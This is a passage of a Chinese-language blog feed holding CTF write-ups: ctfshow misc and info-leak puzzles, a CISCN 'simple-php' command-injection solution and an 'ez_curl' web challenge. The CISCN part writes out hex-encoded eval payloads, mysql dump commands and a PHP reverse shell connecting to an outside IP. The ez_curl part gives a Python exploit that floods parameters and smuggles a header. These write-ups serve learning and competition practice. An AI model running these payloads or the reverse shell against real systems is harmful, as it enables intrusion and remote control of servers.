vim是linux自带且常用的文件编辑器，vim在编辑时会生成一个隐藏的临时文件，当vim非正常关闭时这个文件就会被保留下来。 使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问/index.php.swp下载备份文件，用记事本打开即可 。</span><br></pre></td></tr></table></figure><ol start="10"><li><pre><code>         cookie泄露</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述:</span><br><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure><p>直接查看cookie</p><p>11.域名txt记录泄露            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br><span class="line">5月30日 修复，目标地址为**flag.ctfshow.com**</span><br></pre></td></tr></table></figure><p>使用在线网站：<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p>现在好像解不出来了，参考了下其他人的wp,答案是flag{just-seesee}</p><ol start="12"><li></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc冲关1</title>
      <link href="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/"/>
      <url>/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/</url>
      
        <content type="html"><![CDATA[<p>1.杂项签到</p><p>使用zip工具发现没有加密，那就是zip伪加密，修改第二个源文件PK的504B0102 xxxx 0900 0800，重新打开即可</p><p>zip伪加密知识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">原理：zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</span><br><span class="line"></span><br><span class="line">背景：**一个 ZIP 文件由三个部分组成：**</span><br><span class="line"></span><br><span class="line">压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 </span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">压缩源文件数据区： </span><br><span class="line"> 50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line"> 14 00：解压文件所需 pkware 版本 </span><br><span class="line"> 00 00：全局方式位标记（有无加密） </span><br><span class="line"> 08 00：压缩方式 </span><br><span class="line"> 5A 7E：最后修改文件时间 </span><br><span class="line"> F7 46：最后修改文件日期 </span><br><span class="line"> 16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line"> 19 00 00 00：压缩后尺寸（25） </span><br><span class="line"> 17 00 00 00：未压缩尺寸（23） </span><br><span class="line"> 07 00：文件名长度 </span><br><span class="line"> 00 00：扩展记录长度 </span><br><span class="line"> 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line"> 压缩源文件目录区： </span><br><span class="line"> 50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line"> 3F 00：压缩使用的 pkware 版本 </span><br><span class="line"> 14 00：解压文件所需 pkware 版本 </span><br><span class="line"> 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） </span><br><span class="line"> 08 00：压缩方式 </span><br><span class="line"> 5A 7E：最后修改文件时间 </span><br><span class="line"> F7 46：最后修改文件日期 </span><br><span class="line"> 16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line"> 19 00 00 00：压缩后尺寸（25） </span><br><span class="line"> 17 00 00 00：未压缩尺寸（23） </span><br><span class="line"> 07 00：文件名长度 </span><br><span class="line"> 24 00：扩展字段长度 </span><br><span class="line"> 00 00：文件注释长度 </span><br><span class="line"> 00 00：磁盘开始号 </span><br><span class="line"> 00 00：内部文件属性 </span><br><span class="line"> 20 00 00 00：外部文件属性 </span><br><span class="line"> 00 00 00 00：局部头部偏移量 </span><br><span class="line"> 6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line"> 压缩源文件目录结束标志： </span><br><span class="line"> 50 4B 05 06：目录结束标记 </span><br><span class="line"> 00 00：当前磁盘编号 </span><br><span class="line"> 00 00：目录区开始磁盘编号 </span><br><span class="line"> 01 00：本磁盘上纪录总数 </span><br><span class="line"> 01 00：目录区中纪录总数 </span><br><span class="line"> 59 00 00 00：目录区尺寸大小 </span><br><span class="line"> 3E 00 00 00：目录区对第一张磁盘的偏移量 </span><br><span class="line"> 00 00：ZIP 文件注释长度</span><br><span class="line"></span><br><span class="line">测试：若把文本区原来显示PK的50 4B改成其他数据，也不可读</span><br></pre></td></tr></table></figure><p>2.misc2</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偶然发现我竟然还有个软盘，勾起了我的回忆。</span><br></pre></td></tr></table></figure><p><img src="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240531145011031.png" alt="image-20240531145011031"></p><p>我的解答:</p><p>随便选择一个虚拟机，编辑虚拟机设置，选择添加，选择软盘驱动器，选择使用软盘映像文件，然后重新打开虚拟机即可。</p><p><img src="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240531145752783.png" alt="image-20240531145752783"></p><p>3.miscx</p><p>给了2个加密txt文件，一个zip(一个图片，一个加密.doc文件)</p><p>信息：rot,or,2020</p><p>猜测2020为密码，将.doc文件成功打开(这里使用word打开i，不然其他方式打开都是乱码，血的教训 啊😿)，音符解密，一眼rabbit,猜测密码仍为2020</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：welcome_to_payhelp</span><br></pre></td></tr></table></figure><p>刚好打开hint.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE</span><br></pre></td></tr></table></figure><p>尝试base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VjJ0U1MxWXlUWGhoTTJ4UVYwWkthRlp0Y0hKa01XeHhVbFJTYkZaVVJrWlZNV2hyVXpGYVJsTnJUbGhpVkVVd1dWVmFkMDVXV2xsaVJUVlRUVzVuTWxVeWVGTlRiVkY0WVROc1VGZEdTbTlXYm5CWFpGWlNTR0Y2UW10V1dFSldWVmQwUzJFeFNYbGhTRTVVWWtaS1MxcEVTa1psVmxweFZtdDBWMUpYZDNwWFZscHZWRzFLUmsxWVJsSmlWR3hvVm1wT2IyVnNiSFZpUmxwc1ZsUkdSbFV4YUd0VWJVWnlVbTVPVlZZelFrZFRiRkpQVWxFbE0wUWxNMFElM0Q%3D</span><br></pre></td></tr></table></figure><p>再次base64,无果，看到有%等符号，尝试 url解码后再次base64解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WkRKV2Mxa3lPWFJhVmprd1lqRTRlVTFFU1hkS1ZFSkNXbTE0YUZwNVZYbE5SMng2U2xSSmQxa3lPWFJoVnpWdVRHazBkVXBVUWtKa1IyaHNTbFJKZDJFeVZqVktWRWwzWVZoTmJFMXFRbTlhVjNoellubFZlVTFFU1hkTmFrRnNUV3BGSlRORQ%3D%3D</span><br></pre></td></tr></table></figure><p>反复url解码，base64解码，最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome_to_2020</span><br><span class="line">flag is coming...</span><br><span class="line">the key is hello 2020!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cs61a打卡学习笔记</title>
      <link href="/2024/05/29/cs61a%E6%89%93%E5%8D%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/29/cs61a%E6%89%93%E5%8D%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="29c0cacdf1b3041aeaed3138fd45e162319f6211b17152d5fcd601957ebc02e0">4630436162ade97ba2718b7d0c4b3b636ffdb9d3587769050f55768e578c9c6c703b9d83f53ed3eefbc7cc0e4225036fe9d13241edcb13f12dfaaa32ea9a1cbeb5c93627d8974a2dbd276cf99c3848dc6e643b675f446655433cb15c318e69308fcd6d25525bb31b4791b1ab5ebddcfe2ae3c86b9ae14401d95e8bbeeaefc93e5270ffea4ca074217e3dd7a81233d722d44989bf7c6d901cfaadde9360d17dc7f3bdcc2e3a6629aa53cbace59de5398095fa5a9d88983559efb83cf6f1ec6b0fa1d36981cc702cf0f59d8252097ba64946aea719d32a149fa4e4d41769800ac24d76a46593756a118c0aecbcbd2d952bc345f96f09c144a15e35c6ad192cd3240ba0fa3a917eb8028493dcd0301eaf79329e5d322b24c6790bf6fdb6563cb863520be1369771910366da4824808b5609ffdee2d5da62e37900ab2f283d58fdb0e32f9406359a1436a6d992a2ce16ec07b7d580f04a5af86bd072acf93302f841ba2ad7523795d05881b449f1369554521101d0eddb08dedd9844942009a0488ad638b61f339aee97e7f0c390192a82b23ab55d96a4d9cb1694e7c2375acdb4805dbd345d17b3059de487199a001d9f3597560ff7a636183f93cc402c12a664047509ac4b06aa1b4f732ff91931dbc736323f6dd9d86b207b91c3d841b8f3ae58cdd2b6e5a3e82da7b8258ca01737b3b483903bdaa10c5c72b50bd5f64ea44443557561084081538efeb6bd6eea0ec241382d220cb9a3dcbeb949f387d0a2bcd64140ceeb36797fb57f59acdd5c29b789c65e1d6c4c1de665a1a9268af7f53ebcdf3c08223a07c3711d09416f3c1ef13d2988f2c4ed54dd39349c90ef7150cde660904c9e7c04f98ca5511a2b536e0713225e78b5d4cc8a6b873b02e0a5a20c0300e55b51fd034d23a0f162c97e856ed2aee758bf5a6f8fd87fa6c44f07e017ce39875de0774595f5b9f4d9f22b9829515e6fd3f356c299d4f60b0b17fd1e4c8794a1382fe0501c90af197a7d70e22e7515e987477a6b7189e74b3224ff98a68130094c8a4dba77da6f77fc42e8f77a9c385226c65c2ed7cde911c94e0fcfb3ad447d980dd20f3d43a96bfd00928877206074842c70b86109fc5acd3d11251e02dc84706c44ca8be924392869b6bf7e9f3dca78e4987ea017ad4992fdb2c9fdfbaf6b23e0a3fe220a703766a4a70ab38b3afce580a34b69d54c03b5f83bd89490122342ef643a1a37ce86ae6226f6814e8f66579ff45ee1ee2a9e37df56eebdc1927052934d747e7d64e4b837adf106a1f850a17318c1ecc44a8a5c781ecc40a70d213ad7c2eb18c4ee2486290772fad46518485d16c1f2a244a9d3b757e755e43c26ad9df8607ad3dec5a728c8482480b490ae2a1b2ae2a7a8d48aa666a294067f243db3ca1a1fb212a21a986813f03bd2e7e73d62c9d71805ae3e6bbedb2ccf0768c80d97758ebd953db0a039804606a1f2581555659620bfd59c0ddaf54923e233dbfe6c29a57d3fda01837247fdc630017cda7ed73cd2da65725ae2abb6282c3841b11b42cc6eb027027cca3982f0fc37fb40f1564026ed17f94f702ead86b4c9b9b44d8b544c8c60e93e86074d1498bb6f11787c5313dd3d0a9f47548ff7ad6fca20f9b456612864638d54f18bc1369de51809689e388cd0963f6f4c45e1635baf848dc170d43db4051f4913c4df06322ae3611e4b3d3bf9809d0dc84bab7b0c4c3106945498c5ff91c7004ede5d719b5704ee94791a58416219e45665b8f10a2ad0a815eba2abe55008c76a14e34d845b18dbe83356489b76eb8ac02c4fa0e6f2dab280dd813f6b9891863eee1ba1339ee74e4f23486c2886b29dbd7a38a1777464c1e2a2202ac3c318f46e384c0c6b28913ed9409141ad9198dda292de8d8ecb51fb22a587c0db349c0f43a3606b419dc5fcbeed82f77959aa8c0f7d1a05aa0945770c68e1aeb42a4eac21aea95fb8da4a775599e2e50ae096d7ac842a7657d92c916de7c33f06d77b16895358d4bfc1271b12278f4975f19fd5780619692a104fabf687e4922cdade46df2d52be288ca5ca5da5a8e1b8e6e4f3d8d920d6d911c2e7f5ce9fc4ddcb50c80db7ba67240b1e161ce060d126a06b5d0b2cf5f357d6e6b8f556302e91c72127352381bba0b8459cac84fe738a0374b81c3a6c0c66e8db54aa7b00048eedc4954c45897786ccc1b117779ca672390b5f05b9e8294df1be945ff31ee828d4594352654e83f63ab3f1feec2c759766faa3def18d2b8ba93e5426ea9b1fb5a181518bdb841def1343b45bfad35eb593923eeeab14e7aa7f2815d3bdc41782652632f093dea253ecf6ae7b4d9281e6620236c76bedb1150f2320cc323aaa17398bd102f4ff1bc04fe63d8839c1ce814e650891cafcc72ffb9701a3512fd9625c52dbaa17ed073921eff6f649c17e8fac7731713a61db3fc1bd40fa4c3e8f7321bea78b463256ace54b47ea86f75a843513158ae3cc63e51a46435249ae0e0f103cd7784ff2a30e459ffe83287182c969ac97f76105e344eba1000437423ec2dc4b20eeb7a6cc9d5beea3f9c78dc4b78f93a0743786ad39b9dc851e67d198ddae3bf27e706a85aa3f69a3358bfa89595f8b9a52d07bb0ea6c6b9607784c03775db601171d1c9a2d81893d1949d5df8b0c44f1494573a485e424f5ae634782d320faef1ff9e9181145d9f09a821a2e91310be54cf16b4bad1a6a6833ca046946af2c13db84d3876eb698a4e9135b2c9a9c6db50970284c42d8c8ab4ef13bf4393db6648cf9c476cb7e2a04e58461234e90bf8ea4722f78ceb66f257f342bf16f86990467d9b40b947ffee2e84d00ed00080b81786791d24ce8d4b83ca68d29be5e65b9fcf294541b328936e39b4eefb6399a552024be48369d3174341866b996af64789183d8f48408b5054b0294775ef81a0a601de4a24b47a276ef1f4259f39390f4433a64000a27c1c2bcf767793268347f37f5c686034e1b01d842e2e85c7e66d34710640e1f641e09e3bfba1c22d23c5b317c1e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>5.28记录</title>
      <link href="/2024/05/28/5-28%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/05/28/5-28%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8ea5075ddf0aecfcde8f07f15611a40874ba54607c6252ef884a5c3a5bcbadf2">0ca2b35c8261f8c795eedabdc3bf52f2fcf7f46fbea3a83a0130a288c3b130466b12b5cf711c62df946cc1eb02f50577a106acdb0a904912f4c5754a2cd5358410bd8dac3ff0924652a6ceb673083265f20c202ea77bb8df84fb74f0da4f65dd1b0c45683fadd701871a196a4b41829cdfa1e7ac08c10a0849e43da55db604cba6d3e660b5975caf60a4d5e1806b4ebdfde25a3b214616bc1d59a9e5b2bc89ad4f10d00dbef5b569a06978cf2f4425dc4877c61ba43baf8a0d7c553f7bd302214d277ae67287a94228e08148692ee752eb8a6c0901bf8481028cba27e8bcf31066f6ea1c67be34757036496a3224e18c37a3611f319f762f54aa9de077e490d553b6101aab937743b12816befe465ad4f4c1807fe040dc75b57497e92b7d871ea5a28da59a14aceb2218da6aa6d88c69c006d24175939c42eb4d780ea63d8617ef37931f3badeae2c946230dd7ba19b8846a56f7e89619f0ec1b5235a4ad6db82c5f14c9c63a7e46f192b59a90efe6c0abc07ae4c9a6312e4c3d3c1971c387f80e8c522eb3a4582beabb090e2be13fc2e3c7de928c694a3fa39fa3842ad402b7510efd3b572536aab2a1143ab241a0c6d3ee24726d47ed93a19e775a256646c8d51cf0c4c463ce2b72fa2ce70c86d18885acb242018f90a1ddca79e9d3e3c74b0d3638babce37f53ccff9e6f81c35ed377d1a1d149f1258236e2e284b8af9ca8605cfafb1ae5964e268c2d09535a1d8f0ccb8a93678e9d3921434cdf183c2e4eab343e3e60998bdf3e1a7a8af3fe59139750c97e62a638ce4260def32da4e5901436064fc3b2490d19647d2c0107938d617cd9f6b342883ff9a50e75de321310da99f28cded2edc8a9926661e36a1a94abbef87d626c012540bcba6ee12980fc8c57d024bdd66c9405e52954ec7d255c4729a379c0f6e061b5fd0d5acf9ba47386935824a20fa298dacb5610b1f98cb4e0997de5da013ac885d5600b257e2c03230f96ed5c2d5fa86b24644ae6c30b60ee9eaa22469d322e97998f56720a37c9d28f045f4f3fd0b35a158b6cca434a30fd2f039805e58ca0e6f7735b477d2588e2e9f59a2a7e0103b51a69803e73a8b94f6d60feb20ccb89ba75b34d38e8c1cd75b0aa8570c5307893c750ad749bcf7dbc96b1d14fecd10da6f05c760fc5fca9a03e540c984d3c0de0c81da6e0c239c1ec491bdc32642ae58caf710c47f6a66895c9138deb59dc0f7334f5c66981252e46d990c53cb5b84ebb390ddb91f3b6954e1524d7bba81f5b82c7aea445d7bda626705fb05d6fdf3bce6cd5edadf07b44be8b0f763e0bb80bc858335422bef955ffcc76d6e0ba24a24808b97d8912ac9aa2f437aa5853f6e39d91c2640c36fc7092f7eec0a7219a2a0ee38e80605223986ef6eec571ad9dc10030e1892ac9cad7d78628e0a7e1bd2d9db8dea9f165d4bcbe6894775acb1dafa6ca840116510d05f1ed01c8e1f472d647c468d8a1c8538e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN复现</title>
      <link href="/2024/05/23/CISCN%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/23/CISCN%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>simple-php</p><p>法一：</p><p>payload:cmd &#x3D; php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));</p><p>知识点：</p><p>要注意的点是：system(‘ls’);分号分号分号！！！！！！</p><p>在PHP中，变量名通常以字母或下划线开始，后面跟着字母、数字或下划线的任意组合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php -r   php -r eval()表示的是运行php代码，不用使用&lt;??&gt;这两个符号</span><br><span class="line">2.hex2bin(&#x27;dfvnjjb983utgnvjmkf&#x27;),将括号里的十六进制转为原始的二进制形式，即十六进制下对应的ascii码字符串</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">做题:</span><br><span class="line">1.尝试读取根目录下的flag,system(&#x27;ls&#x27;);,system(&#x27;cat /f*&#x27;) ,但是没有</span><br><span class="line">2.只能从数据库里面读取,echo:是一个Shell命令，用于输出文本或变量的值到标准输出（通常是屏幕）。反引号表示执行反引号内的命令</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show databases;&#x27;`;</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;&#x27;`;</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7;&#x27;`;</span><br><span class="line">注：在命令行中使用mysql命令时，-p选项后面紧接着应该是指定的密码，而且不应该有空格。这是因为-p后面直接跟的参数被认为是密码值，直到遇到下一个参数分隔符（通常是空格）为止。如果在-p和密码之间有空格，命令行解释器会认为-p后面没有紧跟密码，从而导致错误或误解密码的输入。</span><br></pre></td></tr></table></figure><p>法二：EOT代替分号，反弹shell，但是没成功🥹，版本问题吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r $a=&lt;&lt;&lt;EOT</span><br><span class="line">6c73</span><br><span class="line">EOT;</span><br><span class="line">eval(system(hex2bin($a)))</span><br></pre></td></tr></table></figure><p>16进制编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(&quot;47.121.25.95&quot;,3456);system(&quot;bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">24736f636b3d66736f636b6f70656e282234372e3132312e32352e3935222c33343536293b73797374656d282262617368203c2633203e263320323e263322293b</span><br></pre></td></tr></table></figure><p>fsockopen(“81.70.163.152”,82);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这段代码使用fsockopen函数尝试与IP地址为   的服务器在端口  上建立一个Socket连接。fsockopen用于在 PHP中创建一个到其他服务器的网络连接，常用于发送数据或接收来自远程服务器的数据。如果连接成功，会返回文件指针（资源类型），在这里赋值给了变量$sock.</span><br></pre></td></tr></table></figure><p>system(“bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用system函数执行了一个shell命令，system函数用于执行外部程序，并且显示输出。这里的命令是启动一个Bash Shell,并进行了标准输入、输出、错误的重定向操作。</span><br><span class="line"></span><br><span class="line">- `&lt;&amp;3` 表示将标准输入（stdin，默认为0）重定向到文件描述符3指向的地方。在大多数情况下，如果之前的操作（如`fsockopen`）没有特别指定，文件描述符3默认不会被分配，但这里假设（基于上下文理解）它是对之前建立的socket连接的引用，意味着Bash将从这个socket接收输入。</span><br><span class="line">- `&gt;&amp;3` 是将标准输出（stdout，默认为1）重定向到文件描述符3，意味着Bash的所有正常输出也将通过这个socket发送出去。</span><br><span class="line">- `2&gt;&amp;3` 则是将标准错误输出（stderr，默认为2）同样重定向到文件描述符3，确保任何错误信息也通过相同的socket传递。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web刷题</title>
      <link href="/2024/05/21/web%E5%88%B7%E9%A2%98/"/>
      <url>/2024/05/21/web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="ez-curl"><a href="#ez-curl" class="headerlink" title="ez_curl"></a>ez_curl</h3><p>知识点：返回索引</p><ul><li><a href="https://www.runoob.com/php/func-string-strripos.html">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strpos.html">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strrpos.html">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><p>考点：</p><p>1.express的parameterLimit默认为1000，即参数最大限制为1000，写脚本请求加上1000个参数就能成功把拼接的&amp;admin&#x3D;flase挤掉</p><p>2.这里根据RFC 7230(HTTP&#x2F;1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII  字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header  是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。</p><p>3.当Content-Type为application&#x2F;x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php:&#x2F;&#x2F;input数据是一致的。</p><p>问题：挤掉&amp;admin&#x3D;false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$offset = stripos($headers[$i], &#x27;:&#x27;);</span><br><span class="line">从头开始不分大小写,在headers的第一个参数找到冒号，返回冒号所在的位置,若未找到，返回False</span><br><span class="line">$key = substr($headers[$i], 0, $offset);</span><br><span class="line">在Headers的第一个参数中截取从0到冒号的值赋给$key  </span><br><span class="line">$value = substr($headers[$i], $offset + 1);</span><br><span class="line">在第一个参数中截取冒号到结尾的值赋给$value</span><br><span class="line">&#123;&quot;headers&quot;: [&quot;xx:xx\nadmin:true&quot;, &quot;Content-Type:application/json&quot;], &quot;params&quot;: &#123;&quot;admin&quot;: &quot;true&quot;, &quot;x0&quot;: 0&#125;</span><br><span class="line">比如它的$key就是xx,$value就是xx，因为\n换行符的原因，admin:true可以被绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://61.147.171.105:49744/&#x27;</span></span><br><span class="line">datas = &#123;</span><br><span class="line">    <span class="string">&#x27;headers&#x27;</span> : [<span class="string">&#x27;xx:xx\n admin:true&#x27;</span>,<span class="string">&#x27;Content-Type: application/json&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span> : &#123;<span class="string">&#x27;admin&#x27;</span>:<span class="string">&#x27;true&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1200</span>):  垃圾字符</span><br><span class="line">    datas[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;x&#x27;</span>+<span class="built_in">str</span>(i)] = i</span><br><span class="line"></span><br><span class="line">data = json.dumps(datas)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 